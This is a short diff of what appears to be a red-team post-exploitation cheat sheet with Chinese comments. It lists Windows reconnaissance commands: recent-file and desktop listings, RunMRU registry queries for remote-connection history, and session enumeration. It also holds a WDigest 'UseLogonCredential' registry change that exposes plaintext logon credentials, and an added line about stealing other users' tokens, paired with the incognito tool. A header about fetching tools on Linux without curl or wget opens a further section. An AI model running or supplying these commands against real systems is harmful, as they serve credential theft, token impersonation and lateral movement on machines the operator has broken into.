@@ -15,6 +15,7 @@ dir /a C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent
 dir /a C:\Users\Administrator\Desktop
 dir /a C:\Users\public\Desktop
 reg query HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+echo "检查是否有其他用户的进程, 窃取令牌"
 # for /f "tokens=2 delims==" %a in ('wmic useraccount where name^="%username%" get sid /value') do set current_sid=%a
 # reg query HKEY_USERS\%current_sid%\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 # reg query HKEY_USERS\S-1-5-21-3921407625-4142045542-3089788233-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU  # 远程连接信息
@@ -35,6 +36,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 net use # 查看网络连接
 quser   # 查看远程连接过来的用户 配合incognito, 再 net use
 net use 
+
 
 # -- linux
 ## 无curl, wget下载文件 tools_get.sh
